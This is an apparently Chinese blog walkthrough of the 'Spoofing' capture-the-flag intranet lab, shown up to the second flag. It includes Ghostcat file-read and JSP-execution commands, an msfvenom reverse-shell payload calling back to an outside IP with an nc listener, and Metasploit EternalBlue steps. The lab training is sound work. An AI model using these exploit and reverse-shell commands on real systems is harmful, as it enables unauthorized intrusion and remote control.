<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>春秋云境-Spoofing | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"tao0845.github.io","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="靶标介绍Spoofing是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。 CNVD-2020-10487[*] WebTitle:http:&#x2F;&#x2F;39.99.154.27:8080  cod">
<meta property="og:type" content="article">
<meta property="og:title" content="春秋云境-Spoofing">
<meta property="og:url" content="https://tao0845.github.io/posts/7ea084a1/index.html">
<meta property="og:site_name" content="ta0的小站">
<meta property="og:description" content="靶标介绍Spoofing是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。 CNVD-2020-10487[*] WebTitle:http:&#x2F;&#x2F;39.99.154.27:8080  cod">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s1.imagehub.cc/images/2025/02/11/2353951a36ee1581b92b477058f7eddf.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2025/02/11/6b79ae037d4530e291fb58b3010216c4.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2025/02/11/72b5e1a20478054c29024bf99b5e4a0e.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2025/02/11/31817f31b588e4f9144d1f29e30506da.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2025/02/11/2676b5bad228ec95a053c820cf768e62.png">
<meta property="article:published_time" content="2025-02-11T08:57:37.238Z">
<meta property="article:modified_time" content="2025-02-13T11:54:06.461Z">
<meta property="article:author" content="ta0">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s1.imagehub.cc/images/2025/02/11/2353951a36ee1581b92b477058f7eddf.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">122</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">14</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">1</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2814928906@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%A0%87%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">靶标介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CNVD-2020-10487"><span class="toc-number">2.</span> <span class="toc-text">CNVD-2020-10487</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ms17-010"><span class="toc-number">3.</span> <span class="toc-text">ms17-010</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PetitPoatam%E5%BC%BA%E5%88%B6%E8%AE%A4%E8%AF%81"><span class="toc-number">4.</span> <span class="toc-text">PetitPoatam强制认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nopac"><span class="toc-number">5.</span> <span class="toc-text">nopac</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://tao0845.github.io/posts/7ea084a1/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">春秋云境-Spoofing</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-02-11 16:57:37" itemprop="dateCreated datePublished" datetime="2025-02-11T16:57:37+08:00">2025-02-11</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2025-02-13 19:54:06" itemprop="dateModified" datetime="2025-02-13T19:54:06+08:00">2025-02-13</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">2.6k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">15m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h2 id="靶标介绍"><a href="#靶标介绍" class="headerlink" title="靶标介绍"></a>靶标介绍</h2><p>Spoofing是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。</p>
<h2 id="CNVD-2020-10487"><a href="#CNVD-2020-10487" class="headerlink" title="CNVD-2020-10487"></a>CNVD-2020-10487</h2><pre class="language-none"><code class="language-none">[*] WebTitle:http:&#x2F;&#x2F;39.99.154.27:8080  code:200 len:7091   title:后台管理</code></pre>
<p>8080端口后台管理<br><img src="https://s1.imagehub.cc/images/2025/02/11/2353951a36ee1581b92b477058f7eddf.png" alt="image" loading="lazy"><br>进去直接是登录状态，后台除了有一些用户名基本都是404<br><img src="https://s1.imagehub.cc/images/2025/02/11/6b79ae037d4530e291fb58b3010216c4.png" alt="image" loading="lazy"><br>tomcat 9.0.30存在任意文件读取漏洞<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42786460/article/details/133269653">https://blog.csdn.net/weixin_42786460/article/details/133269653</a><br><a target="_blank" rel="noopener" href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">PS E:<span class="token punctuation">\</span>downloads<span class="token punctuation">\</span>Ghostcat-CNVD-2020-10487-master<span class="token operator">></span> python ajpShooter.py http://39.99.154.27:8080 <span class="token number">8009</span>  /WEB-INF/web.xml <span class="token builtin class-name">read</span>

       _    _         __ _                 _
      /_<span class="token punctuation">\</span>  <span class="token punctuation">(</span>_<span class="token punctuation">)</span>_ __   / _<span class="token punctuation">\</span> <span class="token operator">|</span>__   ___   ___ <span class="token operator">|</span> <span class="token operator">|</span>_ ___ _ __
     //_<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token string">'_ \  \ \| '</span>_ <span class="token punctuation">\</span> / _ <span class="token punctuation">\</span> / _ <span class="token punctuation">\</span><span class="token operator">|</span> __/ _ <span class="token punctuation">\</span> '__<span class="token operator">|</span>
    /  _  <span class="token punctuation">\</span><span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> _<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">||</span>  __/ <span class="token operator">|</span>
    <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span>_// <span class="token operator">|</span> .__/  <span class="token punctuation">\</span>__/_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___/ <span class="token punctuation">\</span>___/ <span class="token punctuation">\</span>__<span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>
         <span class="token operator">|</span>__/<span class="token operator">|</span>_<span class="token operator">|</span>
                                                00theway,just <span class="token keyword">for</span> <span class="token builtin class-name">test</span>


<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token number">200</span>
<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token punctuation">]</span> Accept-Ranges: bytes
<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token punctuation">]</span> ETag: W/<span class="token string">"2489-1670857638305"</span>
<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token punctuation">]</span> Last-Modified: Mon, <span class="token number">12</span> Dec <span class="token number">2022</span> <span class="token number">15</span>:07:18 GMT
<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token punctuation">]</span> Content-Type: application/xml
<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token punctuation">]</span> Content-Length: <span class="token number">2489</span>

<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE web-app PUBLIC
 <span class="token string">"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"</span>
 <span class="token string">"http://java.sun.com/dtd/web-app_2_3.dtd"</span> <span class="token operator">></span>

<span class="token operator">&lt;</span>web-app<span class="token operator">></span>
  <span class="token operator">&lt;</span>display-name<span class="token operator">></span>Archetype Created Web Application<span class="token operator">&lt;</span>/display-name<span class="token operator">></span>

  <span class="token operator">&lt;</span>security-constraint<span class="token operator">></span>
    <span class="token operator">&lt;</span>display-name<span class="token operator">></span>Tomcat Server Configuration Security Constraint<span class="token operator">&lt;</span>/display-name<span class="token operator">></span>
    <span class="token operator">&lt;</span>web-resource-collection<span class="token operator">></span>
      <span class="token operator">&lt;</span>web-resource-name<span class="token operator">></span>Protected Area<span class="token operator">&lt;</span>/web-resource-name<span class="token operator">></span>
      <span class="token operator">&lt;</span>url-pattern<span class="token operator">></span>/upload/*<span class="token operator">&lt;</span>/url-pattern<span class="token operator">></span>
    <span class="token operator">&lt;</span>/web-resource-collection<span class="token operator">></span>
    <span class="token operator">&lt;</span>auth-constraint<span class="token operator">></span>
      <span class="token operator">&lt;</span>role-name<span class="token operator">></span>admin<span class="token operator">&lt;</span>/role-name<span class="token operator">></span>
    <span class="token operator">&lt;</span>/auth-constraint<span class="token operator">></span>
  <span class="token operator">&lt;</span>/security-constraint<span class="token operator">></span>

  <span class="token operator">&lt;</span>error-page<span class="token operator">></span>
    <span class="token operator">&lt;</span>error-code<span class="token operator">></span><span class="token number">40</span><span class="token operator"><span class="token file-descriptor important">4</span>&lt;</span>/error-code<span class="token operator">></span>
    <span class="token operator">&lt;</span>location<span class="token operator">></span>/404.html<span class="token operator">&lt;</span>/location<span class="token operator">></span>
  <span class="token operator">&lt;</span>/error-page<span class="token operator">></span>

  <span class="token operator">&lt;</span>error-page<span class="token operator">></span>
    <span class="token operator">&lt;</span>error-code<span class="token operator">></span><span class="token number">40</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>/error-code<span class="token operator">></span>
    <span class="token operator">&lt;</span>location<span class="token operator">></span>/error.html<span class="token operator">&lt;</span>/location<span class="token operator">></span>
  <span class="token operator">&lt;</span>/error-page<span class="token operator">></span>

  <span class="token operator">&lt;</span>error-page<span class="token operator">></span>
    <span class="token operator">&lt;</span>exception-type<span class="token operator">></span>java.lang.Throwable<span class="token operator">&lt;</span>/exception-type<span class="token operator">></span>
    <span class="token operator">&lt;</span>location<span class="token operator">></span>/error.html<span class="token operator">&lt;</span>/location<span class="token operator">></span>
  <span class="token operator">&lt;</span>/error-page<span class="token operator">></span>

  <span class="token operator">&lt;</span>servlet<span class="token operator">></span>
    <span class="token operator">&lt;</span>servlet-name<span class="token operator">></span>HelloServlet<span class="token operator">&lt;</span>/servlet-name<span class="token operator">></span>
    <span class="token operator">&lt;</span>servlet-class<span class="token operator">></span>com.example.HelloServlet<span class="token operator">&lt;</span>/servlet-class<span class="token operator">></span>
  <span class="token operator">&lt;</span>/servlet<span class="token operator">></span>
  <span class="token operator">&lt;</span>servlet-mapping<span class="token operator">></span>
    <span class="token operator">&lt;</span>servlet-name<span class="token operator">></span>HelloServlet<span class="token operator">&lt;</span>/servlet-name<span class="token operator">></span>
    <span class="token operator">&lt;</span>url-pattern<span class="token operator">></span>/HelloServlet<span class="token operator">&lt;</span>/url-pattern<span class="token operator">></span>
  <span class="token operator">&lt;</span>/servlet-mapping<span class="token operator">></span>

  <span class="token operator">&lt;</span>servlet<span class="token operator">></span>
    <span class="token operator">&lt;</span>display-name<span class="token operator">></span>LoginServlet<span class="token operator">&lt;</span>/display-name<span class="token operator">></span>
    <span class="token operator">&lt;</span>servlet-name<span class="token operator">></span>LoginServlet<span class="token operator">&lt;</span>/servlet-name<span class="token operator">></span>
    <span class="token operator">&lt;</span>servlet-class<span class="token operator">></span>com.example.LoginServlet<span class="token operator">&lt;</span>/servlet-class<span class="token operator">></span>
  <span class="token operator">&lt;</span>/servlet<span class="token operator">></span>
  <span class="token operator">&lt;</span>servlet-mapping<span class="token operator">></span>
    <span class="token operator">&lt;</span>servlet-name<span class="token operator">></span>LoginServlet<span class="token operator">&lt;</span>/servlet-name<span class="token operator">></span>
    <span class="token operator">&lt;</span>url-pattern<span class="token operator">></span>/LoginServlet<span class="token operator">&lt;</span>/url-pattern<span class="token operator">></span>
  <span class="token operator">&lt;</span>/servlet-mapping<span class="token operator">></span>

  <span class="token operator">&lt;</span>servlet<span class="token operator">></span>
    <span class="token operator">&lt;</span>display-name<span class="token operator">></span>RegisterServlet<span class="token operator">&lt;</span>/display-name<span class="token operator">></span>
    <span class="token operator">&lt;</span>servlet-name<span class="token operator">></span>RegisterServlet<span class="token operator">&lt;</span>/servlet-name<span class="token operator">></span>
    <span class="token operator">&lt;</span>servlet-class<span class="token operator">></span>com.example.RegisterServlet<span class="token operator">&lt;</span>/servlet-class<span class="token operator">></span>
  <span class="token operator">&lt;</span>/servlet<span class="token operator">></span>
  <span class="token operator">&lt;</span>servlet-mapping<span class="token operator">></span>
    <span class="token operator">&lt;</span>servlet-name<span class="token operator">></span>RegisterServlet<span class="token operator">&lt;</span>/servlet-name<span class="token operator">></span>
    <span class="token operator">&lt;</span>url-pattern<span class="token operator">></span>/RegisterServlet<span class="token operator">&lt;</span>/url-pattern<span class="token operator">></span>
  <span class="token operator">&lt;</span>/servlet-mapping<span class="token operator">></span>

  <span class="token operator">&lt;</span>servlet<span class="token operator">></span>
    <span class="token operator">&lt;</span>display-name<span class="token operator">></span>UploadTestServlet<span class="token operator">&lt;</span>/display-name<span class="token operator">></span>
    <span class="token operator">&lt;</span>servlet-name<span class="token operator">></span>UploadTestServlet<span class="token operator">&lt;</span>/servlet-name<span class="token operator">></span>
    <span class="token operator">&lt;</span>servlet-class<span class="token operator">></span>com.example.UploadTestServlet<span class="token operator">&lt;</span>/servlet-class<span class="token operator">></span>
  <span class="token operator">&lt;</span>/servlet<span class="token operator">></span>
  <span class="token operator">&lt;</span>servlet-mapping<span class="token operator">></span>
    <span class="token operator">&lt;</span>servlet-name<span class="token operator">></span>UploadTestServlet<span class="token operator">&lt;</span>/servlet-name<span class="token operator">></span>
    <span class="token operator">&lt;</span>url-pattern<span class="token operator">></span>/UploadServlet<span class="token operator">&lt;</span>/url-pattern<span class="token operator">></span>
  <span class="token operator">&lt;</span>/servlet-mapping<span class="token operator">></span>

  <span class="token operator">&lt;</span>servlet<span class="token operator">></span>
    <span class="token operator">&lt;</span>display-name<span class="token operator">></span>DownloadFileServlet<span class="token operator">&lt;</span>/display-name<span class="token operator">></span>
    <span class="token operator">&lt;</span>servlet-name<span class="token operator">></span>DownloadFileServlet<span class="token operator">&lt;</span>/servlet-name<span class="token operator">></span>
    <span class="token operator">&lt;</span>servlet-class<span class="token operator">></span>com.example.DownloadFileServlet<span class="token operator">&lt;</span>/servlet-class<span class="token operator">></span>
  <span class="token operator">&lt;</span>/servlet<span class="token operator">></span>
  <span class="token operator">&lt;</span>servlet-mapping<span class="token operator">></span>
    <span class="token operator">&lt;</span>servlet-name<span class="token operator">></span>DownloadFileServlet<span class="token operator">&lt;</span>/servlet-name<span class="token operator">></span>
    <span class="token operator">&lt;</span>url-pattern<span class="token operator">></span>/DownloadServlet<span class="token operator">&lt;</span>/url-pattern<span class="token operator">></span>
  <span class="token operator">&lt;</span>/servlet-mapping<span class="token operator">></span>
<span class="token operator">&lt;</span>/web-app<span class="token operator">></span></code></pre>
<p><code>/UploadServlet</code>可以文件上传<br><img src="https://s1.imagehub.cc/images/2025/02/11/72b5e1a20478054c29024bf99b5e4a0e.png" alt="image" loading="lazy"><br>上传一个jsp</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  msfvenom <span class="token parameter variable">-p</span> java/jsp_shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">101.43</span>.121.110 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4567</span> <span class="token parameter variable">-f</span> raw <span class="token parameter variable">-o</span> shell.jsp</code></pre>
<p><img src="https://s1.imagehub.cc/images/2025/02/11/31817f31b588e4f9144d1f29e30506da.png" alt="image" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">PS E:<span class="token punctuation">\</span>downloads<span class="token punctuation">\</span>Ghostcat-CNVD-2020-10487-master<span class="token operator">></span> python .<span class="token punctuation">\</span>ajpShooter.py http://39.99.154.27:8080 <span class="token number">8009</span> /upload/2540375b90e122c260e334f08521bcf6/20250211053016645.txt <span class="token builtin class-name">eval</span>

       _    _         __ _                 _
      /_<span class="token punctuation">\</span>  <span class="token punctuation">(</span>_<span class="token punctuation">)</span>_ __   / _<span class="token punctuation">\</span> <span class="token operator">|</span>__   ___   ___ <span class="token operator">|</span> <span class="token operator">|</span>_ ___ _ __
     //_<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token string">'_ \  \ \| '</span>_ <span class="token punctuation">\</span> / _ <span class="token punctuation">\</span> / _ <span class="token punctuation">\</span><span class="token operator">|</span> __/ _ <span class="token punctuation">\</span> '__<span class="token operator">|</span>
    /  _  <span class="token punctuation">\</span><span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> _<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">||</span>  __/ <span class="token operator">|</span>
    <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span>_// <span class="token operator">|</span> .__/  <span class="token punctuation">\</span>__/_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___/ <span class="token punctuation">\</span>___/ <span class="token punctuation">\</span>__<span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>
         <span class="token operator">|</span>__/<span class="token operator">|</span>_<span class="token operator">|</span>
                                                00theway,just <span class="token keyword">for</span> <span class="token builtin class-name">test</span>


<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token number">200</span>
<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token punctuation">]</span> Set-Cookie: <span class="token assign-left variable">JSESSIONID</span><span class="token operator">=</span>46B465DD5E412963F419E0B58D25262D<span class="token punctuation">;</span> <span class="token assign-left variable">Path</span><span class="token operator">=</span>/<span class="token punctuation">;</span> HttpOnly
<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token punctuation">]</span> Content-Type: text/html<span class="token punctuation">;</span><span class="token assign-left variable">charset</span><span class="token operator">=</span>ISO-8859-1
<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token punctuation">]</span> Content-Length: <span class="token number">6</span></code></pre>


<pre class="language-bash" data-language="bash"><code class="language-bash">root@VM-4-13-ubuntu:~<span class="token comment"># nc -lvnp 4567</span>
Listening on <span class="token number">0.0</span>.0.0 <span class="token number">4567</span>
Connection received on <span class="token number">39.99</span>.154.27 <span class="token number">58900</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@ubuntu:~/flag<span class="token comment"># cat flag01.txt </span>
  ████████                             ████ ██                 
 ██░░░░░░  ██████                     ░██░ ░░            █████ 
░██       ░██░░░██  ██████   ██████  ██████ ██ ███████  ██░░░██
░█████████░██  ░██ ██░░░░██ ██░░░░██░░░██░ ░██░░██░░░██░██  ░██
░░░░░░░░██░██████ ░██   ░██░██   ░██  ░██  ░██ ░██  ░██░░██████
       ░██░██░░░  ░██   ░██░██   ░██  ░██  ░██ ░██  ░██ ░░░░░██
 ████████ ░██     ░░██████ ░░██████   ░██  ░██ ███  ░██  █████ 
░░░░░░░░  ░░       ░░░░░░   ░░░░░░    ░░   ░░ ░░░   ░░  ░░░░░  

This is the first flag you get.

flag01: flag<span class="token punctuation">&#123;</span>959e270d-4172-4a25-b0bd-cb79a27ce2a8<span class="token punctuation">&#125;</span></code></pre>
<h2 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17-010"></a>ms17-010</h2><p>内网扫描</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">172.22</span>.11.6  DC xiaorang.lab
<span class="token number">172.22</span>.11.26 XIAORANG<span class="token punctuation">\</span>XR-LCM3AE8B
<span class="token number">172.22</span>.11.45 XR-DESKTOP.xiaorang.lab MS17-010
<span class="token number">172.22</span>.11.76 外网</code></pre>
<p>有ms17-010,先打</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  proxychains4 <span class="token parameter variable">-q</span> msfconsole
msf6 <span class="token operator">></span> use exploit/windows/smb/ms17_010_eternalblu
msf6 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload  payload/windows/x64/meterpreter/bind_tcp
msf6 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> rhosts <span class="token number">172.22</span>.11.45
msf6 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">></span> run</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> <span class="token function">cat</span> flag02.txt
                                                      <span class="token comment">##                        </span>
  <span class="token builtin class-name">:</span><span class="token comment">####:                                   :####      ##                        </span>
 <span class="token builtin class-name">:</span><span class="token comment">######                                   #####      ##                        </span>
 <span class="token comment">##:  :#                                   ##                                   </span>
 <span class="token comment">##        ##.###:    .####.    .####.   #######    ####     ##.####    :###:## </span>
 <span class="token comment">###:      #######:  .######.  .######.  #######    ####     #######   .####### </span>
 <span class="token builtin class-name">:</span><span class="token comment">#####:   ###  ###  ###  ###  ###  ###    ##         ##     ###  :##  ###  ### </span>
  <span class="token builtin class-name">.</span><span class="token comment">#####:  ##.  .##  ##.  .##  ##.  .##    ##         ##     ##    ##  ##.  .## </span>
     <span class="token builtin class-name">:</span><span class="token comment">###  ##    ##  ##    ##  ##    ##    ##         ##     ##    ##  ##    ## </span>
       <span class="token comment">##  ##.  .##  ##.  .##  ##.  .##    ##         ##     ##    ##  ##.  .## </span>
 <span class="token comment">#:.  :##  ###  ###  ###  ###  ###  ###    ##         ##     ##    ##  ###  ### </span>
